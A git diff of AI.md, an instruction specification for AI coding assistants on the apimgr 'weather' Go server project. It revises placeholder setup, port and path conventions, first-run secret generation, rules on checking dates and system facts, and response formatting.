@@ -4,21 +4,76 @@
 
 ---
 
-# AI.md Sync Status
+# 🆕 FIRST-TIME AI.md SETUP
 
-This copy was refreshed from `~/Projects/github/apimgr/TEMPLATE.md` and configured for:
+**If you see `weather` or `WEATHER` placeholders in this file, this is a fresh template that needs configuration.**
 
-| Field | Value |
-|-------|-------|
-| Project | `weather` |
-| Organization | `apimgr` |
-| Version | `1.0.0` |
-| Official Site | `https://wthr.top` |
-| Admin Path | `admin` |
-| API Version | `v1` |
-| Repository | `https://github.com/apimgr/weather` |
+## Detecting Fresh Template
 
-This section is now reference-only. If template placeholders are reintroduced in a future refresh, repeat the project-specific replacement step before using the spec.
+```bash
+# Check if placeholders exist (fresh template)
+grep -q 'weather' AI.md && echo "FRESH TEMPLATE - needs setup"
+```
+
+## Auto-Detecting Project Values
+
+**Project name and org can be inferred automatically:**
+
+| Value | Primary Source | Fallback |
+|-------|----------------|----------|
+| `weather` | IDEA.md (if exists) | `basename "$PWD"` |
+| `apimgr` | IDEA.md (if exists) | `basename "$(dirname "$PWD")"` |
+
+**Detection commands:**
+```bash
+# Project name: current directory name
+projectname=$(basename "$PWD")
+
+# Project org: parent directory name (assumes ~/org/project structure)
+projectorg=$(basename "$(dirname "$PWD")")
+
+# Example: /home/user/github/myorg/myproject
+#   projectname = myproject
+#   projectorg = myorg
+```
+
+## First-Time Setup Flow
+
+```
+AI reads AI.md for the first time
+│
+├─► Check: Does AI.md contain literal "weather"?
+│   │
+│   ├─► YES (fresh template)
+│   │   │
+│   │   ├─► 1. Check if IDEA.md exists
+│   │   │   ├─► YES: Extract projectname/projectorg from IDEA.md
+│   │   │   └─► NO: Infer from directory structure
+│   │   │
+│   │   ├─► 2. Confirm with user: "Project: weather, Org: apimgr - correct?"
+│   │   │
+│   │   ├─► 3. Replace ALL placeholders in AI.md:
+│   │   │   - weather → actual project name (lowercase)
+│   │   │   - WEATHER → actual project name (UPPERCASE)
+│   │   │   - apimgr → actual org name (lowercase)
+│   │   │   - APIMGR → actual org name (UPPERCASE)
+│   │   │
+│   │   └─► 4. Create IDEA.md if it doesn't exist (from template or ask user)
+│   │
+│   └─► NO (already configured)
+│       └─► Proceed with normal operation - read PART 0 first
+```
+
+## Placeholder Reference
+
+| Placeholder | Case | Example |
+|-------------|------|---------|
+| `weather` | lowercase | `myapp` |
+| `WEATHER` | UPPERCASE | `MYAPP` |
+| `apimgr` | lowercase | `myorg` |
+| `APIMGR` | UPPERCASE | `MYORG` |
+
+**After setup, this section becomes reference-only. The placeholders above will show actual values.**
 
 ---
 
@@ -94,7 +149,7 @@ IDEA.md is the project PLAN. AI.md (this file) is the SOURCE OF TRUTH.
 **Rules for Updating:**
 
 1. **IDEA.md**: Update business logic, data models, features
-   - AI.md PARTS 0-36 define implementation patterns (do NOT modify)
+   - AI.md PARTS 0-37 define implementation patterns (do NOT modify)
    - IDEA.md defines YOUR project's features (update as needed)
 2. **README.md**: Keep feature list and usage examples current
 3. **docs/**: Update when config options or API behavior changes
@@ -370,8 +425,9 @@ if cacheSize > 1024*1024*1024 {
 | **Multi-stage Dockerfile** | Builder stage (golang:alpine) + Runtime stage (alpine:latest) |
 | **Dockerfile location** | `docker/Dockerfile` - NEVER in project root |
 | **Default timezone** | `America/New_York` (override with `TZ` env var) |
-| **Internal port** | Default `80` - app listens on `0.0.0.0:80` (override with `PORT` env var) |
-| **External port** | Random `64xxx` port mapped to internal 80: `64580:80` |
+| **Internal port (container)** | `80` — container network namespace is isolated from the host, so port 80 is always safe inside a container. Override with `PORT` env var only if explicitly required. |
+| **External port (host-side)** | Random unused port on the runtime host, picked at first install and **persisted** (saved to config) so it stays the same on every restart. Convention: pick from `64xxx` range (e.g., `64580:80`). |
+| **Native port (no container)** | Same rule as host-side: random unused port on the runtime host, persisted across restarts. Default is NOT `80` for native — port 80 is reserved for inside-container use. |
 | **STOPSIGNAL** | `SIGRTMIN+3` |
 | **ENTRYPOINT** | `["tini", "-p", "SIGTERM", "--", "/usr/local/bin/entrypoint.sh"]` |
 | **NEVER modify ENTRYPOINT/CMD** | All customization via entrypoint.sh |
@@ -382,23 +438,34 @@ if cacheSize > 1024*1024*1024 {
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────┐
-│  CONTAINER DEFAULT: 0.0.0.0:80                                          │
+│  CONTAINER DEFAULT: 0.0.0.0:80  (inside container only)                 │
 │                                                                         │
 │  Inside container:  app --address 0.0.0.0 --port 80                    │
-│  Docker mapping:    -p {randomport}:80  (e.g., -p 64580:80)            │
+│  Docker mapping:    -p {random_port}:80  (e.g., -p 64580:80)            │
 │                                                                         │
-│  Override with env vars:                                                │
-│    - PORT=8080      (change internal port, update docker-compose too)  │
-│    - ADDRESS=...    (rarely needed, default 0.0.0.0 is correct)        │
+│  NATIVE DEFAULT: 0.0.0.0:{random_unused_port}  (persisted)              │
+│                                                                         │
+│  First start: pick a random unused port on the host, save it to config │
+│  Every restart: read the saved port from config, use the same value    │
+│  Manual override: PORT env var or --port flag                          │
 └─────────────────────────────────────────────────────────────────────────┘
 ```
 
 | Context | Address | Port | Example |
 |---------|---------|------|---------|
-| **Container (default)** | `0.0.0.0` | `80` | `-p 64580:80` |
+| **Container (default)** | `0.0.0.0` | `80` (always — isolated namespace) | `-p 64580:80` |
 | **Container (custom)** | `0.0.0.0` | `PORT` env | `PORT=8080` + `-p 64580:8080` |
-| **Local (dev)** | `0.0.0.0` | Random `64xxx` | `--address 0.0.0.0 --port 64580` |
-| **Local (prod)** | Specific IP | Random `64xxx` | `--address 192.168.1.100 --port 64580` |
+| **Local (dev)** | `0.0.0.0` | Random unused, persisted (`64xxx` convention) | `--address 0.0.0.0 --port 64580` |
+| **Local (prod)** | Specific IP | Random unused, persisted (`64xxx` convention) | `--address 192.168.1.100 --port 64580` |
+
+**Why random + persisted for native?**
+
+| Reason | Detail |
+|--------|--------|
+| No conflict | Picking an unused port at install means we don't fight with whatever else is running on the host (nginx on 80, etc.) |
+| No re-pick | Persisting the chosen port means the URL doesn't change between restarts — important for bookmarks, scripts, reverse-proxy configs |
+| No magic-port lock-in | Hard-coding 80 forces the operator to either run as root or fight CAP_NET_BIND_SERVICE; random `64xxx` runs as a normal user |
+| Why 80 inside containers | Container network namespace is its own — port 80 on the inside maps to the random host port via `-p`, so there's no collision with anything else on the host |
 
 ## CI/CD Rules
 
@@ -715,7 +782,7 @@ Quick reference: Accept `yes/no`, `true/false`, `1/0`, `on/off`, `enable/disable
 | `config/` in root | Config is embedded, runtime-generated in OS dirs |
 | `data/` in root | Data goes to OS data directory at runtime |
 | `logs/` in root | Logs go to OS log directory at runtime |
-| `tmp/`, `temp/` in root | Use `/tmp/apimgr/weather-XXXXXX/` |
+| `tmp/`, `temp/` in root | Use `/tmp/apimgr/{internal_name}-XXXXXX/` |
 | `test-data/` in root | Test data goes to temp directories |
 | `build/`, `dist/`, `out/` | Use `binaries/` (gitignored) |
 | `vendor/` | Use Go modules, not vendoring |
@@ -916,7 +983,7 @@ For complete details, see AI.md PART 0, 1
 | /server/help | IDEA.md → real endpoints, real curl examples, real FAQ |
 | /server/privacy | Config → `server.privacy.*` settings |
 | /server/terms | Config → customizable, default template |
-| /server/contact | Config → `server.contact` settings |
+| /server/contact | Config → `server.contact.general.*` (recipient + webhooks; falls back to `server.contact.admin.*`) |
 
 ## SERVER VS CLIENT
 | Task | Where | Why |
@@ -1059,7 +1126,7 @@ On EVERY new conversation or after "context compacted" message:
 ## Key Placeholders
 - `weather` = [actual project name]
 - `apimgr` = [organization name]
-- `admin` = [admin URL path, default: admin]
+- `{admin_path}` = [admin URL path, default: admin]
 
 ## Account Types (CRITICAL)
 - **Server Admin** = manages the app (NOT a privileged OS user)
@@ -1110,7 +1177,7 @@ On EVERY new conversation or after "context compacted" message:
 - AI behavior: `.claude/rules/ai-rules.md` (PART 0, 1)
 - Project structure: `.claude/rules/project-rules.md` (PART 2, 3, 4)
 - Frontend/WebUI: `.claude/rules/frontend-rules.md` (PART 16, 17)
-- Full spec: `AI.md` (~55k lines) ← **SOURCE OF TRUTH**
+- Full spec: `AI.md` (~60k lines) ← **SOURCE OF TRUTH**
 
 ## Current Project State
 [AI updates this section as work progresses]
@@ -1531,27 +1598,42 @@ Instructions for how this agent should behave...
 
 | Placeholder | Description | Example |
 |-------------|-------------|---------|
-| `weather` | Project name (lowercase, no spaces/hyphens) | `jokes`, `echoip`, `pastebin` |
+| `weather` | Project name (lowercase, no spaces/hyphens). May change if the binary is renamed (e.g., `cp jokes myjokes` → `weather` becomes `myjokes`). For paths that must NOT change on rename, use `{internal_name}`. | `jokes`, `echoip`, `pastebin` |
+| `{internal_name}` | **Locked filesystem identity** — equal to the value of `weather` at first install and NEVER changes thereafter, even if the binary is later renamed. Used for `{config_dir}`, `{data_dir}`, `{log_dir}`, `{cache_dir}`, `{backup_dir}`, `{db_dir}`, `{pid_file}`, systemd unit names, and any other on-disk path or system identifier where rename-stability is required. Stored in the project's runtime config so it survives binary renames. | `jokes` (forever, even after rename) |
 | `apimgr` | Organization/owner name (lowercase) | `sneak`, `acme`, `mycompany` |
-| `1.0.0` | Current version (semver format) | `1.0.0`, `2.3.1` |
+| `{project_version}` | Current version (semver format) | `1.0.0`, `2.3.1` |
+| `https://github.com/apimgr/weather` | Full URL to the project repository | `https://github.com/sneak/jokes`, `https://gitlab.com/acme/echoip` |
+| `{learned_origins}` | Space-separated list of domains the app trusts at runtime — the union of `DOMAIN` env entries (priority 2) and reverse-proxy-detected hosts (priority 3) per the CORS Allow-list Resolution Order (PART 16 → CORS). Used in CSP `connect-src`, CSP `frame-ancestors`, CSP `form-action`, and any other place a runtime-learned host list is needed. Emitted as `https://a.example https://b.example` (each entry includes scheme; `https://` only unless SSL is disabled, in which case `http://` mirrors are added). | `https://api.acme.com https://www.acme.com` |
+| `{plist_label}` | macOS launchd Label / Windows service ID / D-Bus name — globally unique reverse-DNS string derived from the project's actual domain. Used as the launchd `<Label>`, the launchd plist filename (with `.plist` appended), the Windows service name, and any other place a reverse-DNS identifier is required. **Derivation rule**, in order of preference: (1) reverse of `https://wthr.top` if defined (e.g., `https://jokes.acme.com` → `com.acme.jokes`); (2) reverse of the host of `https://github.com/apimgr/weather` joined with `apimgr` and `{internal_name}` (e.g., `github.com/acme/jokes` → `io.github.acme.jokes` per the GitHub-Pages convention; `gitlab.com/acme/jokes` → `io.gitlab.acme.jokes`; `codeberg.org/acme/jokes` → `page.codeberg.acme.jokes`); (3) `local.apimgr.{internal_name}` as a last-resort fallback. Stored in config at first install and persisted across restarts (same persistence rule as `{port}` and `{internal_name}`). | `com.acme.jokes`, `io.github.acme.jokes`, `local.acme.jokes` |
 | `WEATHER` | Uppercase project name (for constants, env vars) | `JOKES`, `ECHOIP` |
 | `https://wthr.top` | Official project website | `https://jokes.example.com` |
-| `wthr.top` | Fully qualified domain name | `api.example.com` |
-| `/` | URL path prefix (auto-detected from reverse proxy) | `/`, `/myproject` |
-| `admin` | Admin panel URL path (configurable, default: `admin`) | `admin`, `manage`, `control` |
-| `v1` | API version prefix (default: `v1`) | `v1`, `v2` |
+| `{fqdn}` | Fully qualified domain name | `api.example.com` |
+| `{base_url}` | URL path prefix (auto-detected from reverse proxy) | `/`, `/myproject` |
+| `{admin_path}` | Admin panel URL path (configurable, default: `admin`) | `admin`, `manage`, `control` |
+| `{api_version}` | API version prefix (default: `v1`) | `v1`, `v2` |
 
-**Directory placeholders (with platform-specific defaults):**
+### Why `{internal_name}` exists separately from `weather`
+
+| Scenario | `weather` | `{internal_name}` |
+|----------|------------------|-------------------|
+| Initial install of `jokes` binary | `jokes` | `jokes` |
+| User runs `cp jokes myjokes && ./myjokes` | `myjokes` (binary basename) | `jokes` (unchanged — config/data still at `/etc/apimgr/jokes/`) |
+| User-visible output (help text, banners, User-Agent) | `myjokes` (matches the binary the user is invoking) | n/a |
+| On-disk paths, systemd unit, log/cache/backup dirs, DB filenames | n/a | `jokes` |
+
+**Rule:** filesystem paths and system identifiers MUST use `{internal_name}`. User-visible strings (CLI banners, `--version` output, User-Agent) MUST use `weather`.
+
+**Directory placeholders (with platform-specific defaults — all use `{internal_name}` so paths survive binary renames):**
 
 | Placeholder | Linux/BSD Default | macOS Default | Windows Default |
 |-------------|-------------------|---------------|-----------------|
-| `{config_dir}` | `/etc/apimgr/weather` | `/Library/Application Support/apimgr/weather` | `%PROGRAMDATA%\apimgr\weather` |
-| `{data_dir}` | `/var/lib/apimgr/weather` | `/Library/Application Support/apimgr/weather` | `%PROGRAMDATA%\apimgr\weather` |
+| `{config_dir}` | `/etc/apimgr/{internal_name}` | `/Library/Application Support/apimgr/{internal_name}` | `%PROGRAMDATA%\apimgr\{internal_name}` |
+| `{data_dir}` | `/var/lib/apimgr/{internal_name}` | `/Library/Application Support/apimgr/{internal_name}` | `%PROGRAMDATA%\apimgr\{internal_name}` |
 | `{db_dir}` | `{data_dir}/db/` | `{data_dir}/db/` | `{data_dir}\db\` |
-| `{log_dir}` | `/var/log/apimgr/weather` | `/Library/Logs/apimgr/weather` | `%PROGRAMDATA%\apimgr\weather\logs` |
-| `{cache_dir}` | `/var/cache/apimgr/weather` | `/Library/Caches/apimgr/weather` | `%PROGRAMDATA%\apimgr\weather\cache` |
-| `{backup_dir}` | `/mnt/Backups/apimgr/weather` | `/Library/Application Support/apimgr/weather/backups` | `%PROGRAMDATA%\apimgr\weather\backups` |
-| `{pid_file}` | `/var/run/apimgr/weather.pid` | `/var/run/apimgr/weather.pid` | N/A (Windows uses SCM) |
+| `{log_dir}` | `/var/log/apimgr/{internal_name}` | `/Library/Logs/apimgr/{internal_name}` | `%PROGRAMDATA%\apimgr\{internal_name}\logs` |
+| `{cache_dir}` | `/var/cache/apimgr/{internal_name}` | `/Library/Caches/apimgr/{internal_name}` | `%PROGRAMDATA%\apimgr\{internal_name}\cache` |
+| `{backup_dir}` | `/mnt/Backups/apimgr/{internal_name}` | `/Library/Application Support/apimgr/{internal_name}/backups` | `%PROGRAMDATA%\apimgr\{internal_name}\backups` |
+| `{pid_file}` | `/var/run/apimgr/{internal_name}.pid` | `/var/run/apimgr/{internal_name}.pid` | N/A (Windows uses SCM) |
 
 **Note:** In Docker containers, `{db_dir}` is `/data/db/sqlite` (see Docker paths section).
 
@@ -1666,7 +1748,7 @@ This distinction exists for clarity. When referring to OS-level resources that b
 
 | Term | Definition |
 |------|------------|
-| **Server Web Setup** | Web-based setup flow at `/admin/server/setup` (HTML pages served by server, accessed in browser) - creates Primary Admin, customizes branding |
+| **Server Web Setup** | Web-based setup flow at `/{admin_path}/server/setup` (HTML pages served by server, accessed in browser) - creates Primary Admin, customizes branding |
 | **CLI Setup Wizard** | Built-in TUI/GUI wizard in CLI binary - prompts for server URL, tests connection, saves config (CLI is the ONLY binary with a built-in wizard) |
 | **Setup Token** | One-time 32-char hex token generated on server first-run, displayed in console, required to access server's web-based setup |
 
@@ -1677,6 +1759,20 @@ This distinction exists for clarity. When referring to OS-level resources that b
 - Token invalidated (file deleted) after successful setup completion
 - File-based because database may not exist yet on first run
 
+**First-Run Secret Generation Order (BEFORE the setup token is shown):**
+
+The binary MUST generate every project-level secret in `app_secrets` (see PART 11 → "Cryptographic Keys") on first start, in this order, before the operator sees the setup token. None of these are user-visible — they're persisted to the database, included in every backup, and never logged.
+
+| # | Secret (`app_secrets.name`) | Length | Used by |
+|---|------------------------------|--------|---------|
+| 1 | `installation_secret` | 32 bytes | HMAC root for `{security_id}`, KDF for PGP private key, future derived material |
+| 2 | `cookie_signing_key` | 32 bytes (HMAC-SHA256) | Session cookie integrity |
+| 3 | `csrf_token_secret` | 32 bytes | CSRF token HMAC base |
+
+Plus the pre-existing **`server.security.encryption_key`** (32 bytes, written to `server.yml`) — generated on the same first-run pass; covers ALL at-rest AES encryption (2FA secrets, security report fallback, future encrypted data). See PART 11 → "Cryptographic Keys" for the full table.
+
+After all secrets exist, the binary generates the setup token and writes its hash to `setup_token.txt`. The plaintext setup token is then printed to stdout. If any secret fails to generate (e.g., `crypto/rand` failure), startup aborts — no fallback to weaker generation.
+
 **Key distinction:** Server serves web pages for setup (browser-based). CLI has a built-in interactive wizard (TUI/GUI). Agent has no wizard (uses connection string).
 
 ## Other Terms
@@ -1686,7 +1782,7 @@ This distinction exists for clarity. When referring to OS-level resources that b
 | **TUI** | Terminal User Interface - interactive terminal app with menus/panels (client supports TUI mode) |
 | **Text Browsers** | INTERACTIVE browsers (lynx, w3m, links, elinks) that receive **no-JS HTML** and render it in text mode; NO JavaScript support - forms via POST, server-rendered only |
 | **HTTP Tools** | NON-INTERACTIVE tools (curl, wget, httpie) that receive pre-formatted text via HTML2TextConverter; they just dump output |
-| **Admin Panel** | WebUI at `/admin` for server administration (path is configurable, default: `admin`) |
+| **Admin Panel** | WebUI at `/{admin_path}` for server administration (path is configurable, default: `admin`) |
 | **WebUI** | Web User Interface - browser-based interface served by the server |
 | **SCM** | Windows Service Control Manager - manages Windows services (replaces PID files on Windows) |
 | **Hostname** | Short hostname (e.g., `web01`) - equivalent to `hostname -s` |
@@ -1701,7 +1797,7 @@ This distinction exists for clarity. When referring to OS-level resources that b
 
 | Purpose | Endpoints | Access | Format |
 |---------|-----------|--------|--------|
-| **Public server status/info** | `/healthz`, `/api/v1/healthz` | **PUBLIC** | HTML/JSON/text |
+| **Public server status/info** | `/healthz`, `/api/{api_version}/healthz` | **PUBLIC** | HTML/JSON/text |
 | **Prometheus metrics** | `/metrics` | **INTERNAL** | Prometheus text exposition (everything) |
 
 **Endpoints:**
@@ -1709,14 +1805,14 @@ This distinction exists for clarity. When referring to OS-level resources that b
 | Endpoint | Description |
 |----------|-------------|
 | `/healthz` | Frontend route - content negotiation (HTML for browsers, JSON for API clients, text for CLI) |
-| `/api/v1/healthz` | API route - always JSON |
+| `/api/{api_version}/healthz` | API route - always JSON |
 | `/metrics` | Prometheus - all metrics, internal only |
 
 **Key differences:**
 
 | Aspect | Public Status (PART 13) | Prometheus Metrics (PART 21) |
 |--------|-------------------------|------------------------------|
-| **Endpoints** | `/healthz`, `/api/v1/healthz` | `/metrics` |
+| **Endpoints** | `/healthz`, `/api/{api_version}/healthz` | `/metrics` |
 | **Visibility** | Public internet | Internal network only |
 | **Authentication** | None | Optional bearer token |
 | **Data** | Public-safe status/info only | Everything (all telemetry) |
@@ -1748,16 +1844,16 @@ This distinction exists for clarity. When referring to OS-level resources that b
 
 ## How to Read This Large File
 
-**AI.md is ~2.0MB and ~55,580 lines. You CANNOT read it all at once. Follow these procedures.**
+**AI.md is ~2.2MB and ~59,800 lines. You CANNOT read it all at once. Follow these procedures.**
 
 ### File Size Reality
 
 | Constraint | Value |
 |------------|-------|
-| File size | ~2.0MB |
-| Line count | ~55,580 lines |
+| File size | ~2.2MB |
+| Line count | ~59,800 lines |
 | Read limit | ~500 lines per read |
-| Full reads needed | ~110 reads (impractical) |
+| Full reads needed | ~120 reads (impractical) |
 
 **Use the PART index to find relevant sections, then read each section COMPLETELY.**
 
@@ -1767,45 +1863,45 @@ This distinction exists for clarity. When referring to OS-level resources that b
 
 | PART | Line | Topic | When to Read |
 |------|------|-------|--------------|
-| 0 | ~1957 | AI Assistant Rules | **ALWAYS READ FIRST**, **AI Behavior Rules**, **Translation Rule** |
-| 1 | ~3775 | Critical Rules | **ALWAYS READ FIRST** |
-| 2 | ~5026 | License & Attribution | License requirements |
-| 3 | ~5360 | Project Structure | Setting up new project, **CI/CD badge detection** |
-| 4 | ~6321 | OS-Specific Paths | Path handling |
-| 5 | ~6515 | Configuration | Config file work, **Path Security**, **Privileged Ports**, **Escalation** |
-| 6 | ~8431 | Application Modes | Mode handling, debug endpoints |
-| 7 | ~9039 | Binary Requirements | Binary building, **Display detection**, **TERM=dumb**, **NO_COLOR** |
-| 8 | ~9688 | Server Binary CLI | CLI flags/commands, **NO_COLOR Support**, **--color/--lang flags** |
-| 9 | ~12865 | Error Handling & Caching | Error/cache patterns |
-| 10 | ~13242 | Database & Cluster | Database work |
-| 11 | ~13788 | Security & Logging | Security features, **Scoped Agent Tokens**, **Context Detection** |
-| 12 | ~15824 | Server Configuration | Server settings, **Allowlist**, **Blocklists**, **GeoIP** |
-| 13 | ~16951 | Health & Versioning | Health endpoints |
-| 14 | ~17702 | API Structure | REST/GraphQL/Route Compliance, **Non-Interactive Text Output** |
-| 15 | ~19335 | SSL/TLS & Let's Encrypt | SSL certificates |
-| 16 | ~20306 | Web Frontend | Frontend/UI, **Sitemap**, **Site Verification**, **Branding/SEO** |
-| 17 | ~26479 | Admin Panel | Admin UI, **Server Admin**, **Scoped Agents API**, **Blocklists**, **Allowlist**, **GeoIP** |
-| 18 | ~28890 | Email & Notifications | Email/SMTP, **SMTP Auto-Detection** |
-| 19 | ~30213 | Scheduler | Background tasks, **NO external schedulers**, **Backup tasks** |
-| 20 | ~30698 | GeoIP | GeoIP features, **Country blocking (deny/allow)** |
-| 21 | ~30795 | Metrics | Prometheus metrics, **INTERNAL only** |
-| 22 | ~32240 | Backup & Restore | Backup features, **Compliance encryption**, **Cluster backups** |
-| 23 | ~32969 | Update Command | Update feature |
-| 24 | ~33448 | Privilege Escalation & Service | Service/privilege work |
-| 25 | ~34357 | Service Support | Systemd/runit/rc.d/launchd templates |
-| 26 | ~34541 | Makefile | Local dev/tests/debug only, **NOT used in CI/CD** |
-| 27 | ~35318 | Docker | Docker/containers, **NEVER copy/symlink binaries** |
-| 28 | ~36826 | CI/CD Workflows | GitHub/GitLab/Gitea Actions |
-| 29 | ~39760 | Testing & Development | Testing/dev workflow, **AI Docker Compose Rules**, **Content Negotiation Testing** |
-| 30 | ~41581 | ReadTheDocs Documentation | Documentation |
-| 31 | ~42313 | I18N & A11Y | Internationalization, **Translation parity (all binaries)**, **--lang flag** |
-| 32 | ~44275 | Tor Hidden Service | Tor support, **binary controls Tor** |
-| 33 | ~46027 | Client & Agent | Client **REQUIRED**, Agent optional - CLI/TUI/GUI, **Scoped Agent Tokens**, **Smart Context**, **First-Run Wizard** |
-| 34 | ~50450 | Multi-User | **OPTIONAL** - Regular User accounts/registration, vanity URLs |
-| 35 | ~54102 | Organizations | **OPTIONAL** - multi-user orgs, vanity URLs |
-| 36 | ~54743 | Custom Domains | **OPTIONAL** - user/org branded domains |
-| 37 | ~55766 | IDEA.md Reference | **Examples only** - NEVER modify |
-| FINAL | ~56020 | Compliance Checklist | Final verification, **AI Quick Reference Rules**, **Console/Banner Checklist**, **I18N Checklist** |
+| 0 | ~1998 | AI Assistant Rules | **ALWAYS READ FIRST**, **AI Behavior Rules**, **Host System Safety Rule**, **Translation Rule** |
+| 1 | ~3956 | Critical Rules | **ALWAYS READ FIRST** |
+| 2 | ~5271 | License & Attribution | License requirements |
+| 3 | ~5605 | Project Structure | Setting up new project, **CI/CD badge detection** |
+| 4 | ~6575 | OS-Specific Paths | Path handling |
+| 5 | ~6769 | Configuration | Config file work, **Path Security**, **Privileged Ports**, **Escalation** |
+| 6 | ~8690 | Application Modes | Mode handling, debug endpoints |
+| 7 | ~9328 | Binary Requirements | Binary building, **Display detection**, **TERM=dumb**, **NO_COLOR** |
+| 8 | ~9982 | Server Binary CLI | CLI flags/commands, **NO_COLOR Support**, **--color/--lang flags** |
+| 9 | ~13294 | Error Handling & Caching | Error/cache patterns |
+| 10 | ~13678 | Database & Cluster | Database work, **Cluster join**, **Anti-split-brain rotation**, **Removed-node cleanup** |
+| 11 | ~14279 | Security & Logging | Security features, **Public Endpoint Safety Principle**, **Cryptographic Keys**, **Security Reports**, **GPG Keypair Management** |
+| 12 | ~16890 | Server Configuration | Server settings, **Allowlist**, **Blocklists**, **GeoIP**, **Contact Configuration**, **Permissions-Policy Configuration** |
+| 13 | ~18199 | Health & Versioning | Health endpoints |
+| 14 | ~18963 | API Structure | REST/GraphQL/Route Compliance, **Non-Interactive Text Output**, **Default Auth by Scope (Canonical Rule)**, **Public Reports Scope** |
+| 15 | ~20683 | SSL/TLS & Let's Encrypt | SSL certificates |
+| 16 | ~21655 | Web Frontend | Frontend/UI, **Sitemap**, **Site Verification**, **Branding/SEO**, **CORS** (with allow-list resolution + credentials-aware echo), **CSRF Protection** (pragmatic bypass rules) |
+| 17 | ~27927 | Admin Panel | Admin UI, **Server Admin**, **Scoped Agents API**, **Blocklists**, **Allowlist**, **GeoIP** |
+| 18 | ~30348 | Email & Notifications | Email/SMTP, **SMTP Auto-Detection** |
+| 19 | ~31676 | Scheduler | Background tasks, **NO external schedulers**, **Backup tasks** |
+| 20 | ~32161 | GeoIP | GeoIP features, **Country blocking (deny/allow)** |
+| 21 | ~32258 | Metrics | Prometheus metrics, **INTERNAL only** |
+| 22 | ~33703 | Backup & Restore | Backup features, **Compliance encryption**, **Cluster backups**, **app_secrets + PGP key included** |
+| 23 | ~34448 | Update Command | Update feature, **SHA-256 verifyChecksum() pattern** (canonical for binary updates) |
+| 24 | ~34927 | Privilege Escalation & Service | Service/privilege work |
+| 25 | ~35836 | Service Support | systemd / OpenRC / SysVinit / runit / rc.d / launchd / Windows SCM templates |
+| 26 | ~36129 | Makefile | Local dev/tests/debug only, **NOT used in CI/CD** |
+| 27 | ~36906 | Docker | Docker/containers, **NEVER copy/symlink binaries** |
+| 28 | ~38414 | CI/CD Workflows | GitHub/GitLab/Gitea Actions |
+| 29 | ~41348 | Testing & Development | Testing/dev workflow, **Host Safety in tests**, **AI Docker Compose Rules**, **Content Negotiation Testing** |
+| 30 | ~43187 | ReadTheDocs Documentation | Documentation |
+| 31 | ~43923 | I18N & A11Y | Internationalization, **Translation parity (all binaries)**, **--lang flag** |
+| 32 | ~45884 | Tor Hidden Service | Tor support, **binary controls Tor** |
+| 33 | ~47636 | Client & Agent | Client **REQUIRED**, Agent optional - CLI/TUI/GUI, **Scoped Agent Tokens**, **Smart Context**, **First-Run Wizard**, **Agent Registration (cluster-style bootstrap)**, **Agent Auto-Update (SHA-256 + TLS)**, **Agent Token Lifecycle**, **CLI Token Revocation Handling**, **CLI Cluster Failover**, **CLI Auto-Update** |
+| 34 | ~52263 | Multi-User | **OPTIONAL** - Regular User accounts/registration, vanity URLs, **Join Cluster Flow (Technical)** |
+| 35 | ~56064 | Organizations | **OPTIONAL** - multi-user orgs, vanity URLs |
+| 36 | ~56705 | Custom Domains | **OPTIONAL** - user/org branded domains |
+| 37 | ~57728 | IDEA.md Reference | **Examples only** - NEVER modify |
+| FINAL | ~57982 | Compliance Checklist | Final verification, **AI Quick Reference Rules**, **Console/Banner Checklist**, **I18N Checklist**, **Host Safety Checklist** |
 
 **When Implementing OPTIONAL PARTs (34-36, Agent from 33):**
 1. Change PART title from `OPTIONAL` → `NON-NEGOTIABLE` in AI.md
@@ -1931,6 +2027,14 @@ grep -n "^|" AI.md | head -50
 | Spec seems incomplete | Fill in the blanks | **Ask for clarification** |
 | "Probably works" | Ship it | **Test it, verify it** |
 | Don't know the answer | Make something up | **Say "I don't know" and research** |
+| Need today's date | Use a date you "remember" or guess from training-data cutoff | **Run `date -u +%Y-%m-%d` (or the OS equivalent) and use that.** A wrong date in a memory entry, audit log, or "Expires" field is a real defect. Same rule for: `date`, `date_time`, `time_stamp`, `last_updated`, `expires_at`, `created_at`. |
+| Need current time/timezone | Assume local zone or pick UTC arbitrarily | **Run `date -u` or `TZ=UTC date` for UTC; `date` (no args) for local zone the binary is actually running in.** Always log timezone explicitly. |
+| Need year (e.g., copyright headers) | Assume from training data | **`date +%Y`** — never write `2024` or `2025` from memory. |
+| Need any SYSTEM-DERIVABLE fact | Guess from prior context (memory, this session, training data) | **Query the system at the moment you need it.** Examples: hostname → `hostname`; OS → `uname -s`; kernel → `uname -r`; arch → `uname -m`; current user → `whoami`; cwd → `pwd`; available memory → `free -m` / `sysctl hw.memsize`; disk → `df`; default temp dir → `${TMPDIR:-/tmp}`; Go version of the build host → `go version`. |
+| Need a file's mtime / size / content | Assume from filename or cached prior knowledge | **`stat`, `ls -l`, `wc -l`, or `Read` the file.** A file may have changed since you last looked. |
+| Need to know if a tool is installed | Assume because "every system has it" | **`command -v <tool>`** before invoking; on missing, report and fall back. |
+| Need an external URL / endpoint to be current | Use a URL you "remember" | **Search the spec first** (most likely already documented), then verify with WebFetch / live request before relying on it. URLs deprecate. |
+| Need a numeric value claimed by the spec (port, retention, threshold) | Round / approximate | **Grep the spec** and copy the exact value. |
 
 ### NEVER Rush or Skip
 
@@ -2066,7 +2170,19 @@ Before I proceed, can you confirm [specific question]?
 □ If unsure about anything, I asked
 ```
 
-## Spec Compliance Rules
+### Mobile-Friendly Output
+
+**Assume the user is on a mobile device with no scrollback.** Format ALL responses, questions, summaries, and previews accordingly.
+
+| Rule | Description |
+|------|-------------|
+| **Short answers** | Default to a few lines. Expand only when the user asks for detail. |
+| **No long previews** | Do not paste large diffs, full file contents, or long tables back into chat. Reference files/lines instead. |
+| **One question at a time** | When asking for clarification, ask the smallest set of questions that unblock the next step — don't dump a long list. |
+| **Compact lists** | Short bullets over paragraphs. Tables only when they add clarity. |
+| **No filler** | Skip restating what the user just said, "I'll now...", "Let me know if...", and trailing summaries that only restate the diff. |
+| **Tight code blocks** | Show only the changed lines or the minimal snippet needed. Never paste an entire file when a few lines suffice. |
+| **Confirm before bulk output** | If a complete answer would exceed roughly one mobile screen, ask first whether to summarize or send the full output. |
 
 ### Core Rules
 
@@ -2157,6 +2273,126 @@ Before I proceed, can you confirm [specific question]?
 - Create report/analysis files (fix directly instead)
 - Rely on memory (ALWAYS re-read)
 - Add unrequested features
+
+### Host System Safety Rule (ALL Command Execution)
+
+**AI MUST NEVER execute commands that modify, reconfigure, or disrupt the HOST system. These same commands ARE permitted inside an isolated guest (container, VM, chroot, network namespace) where the blast radius is contained.**
+
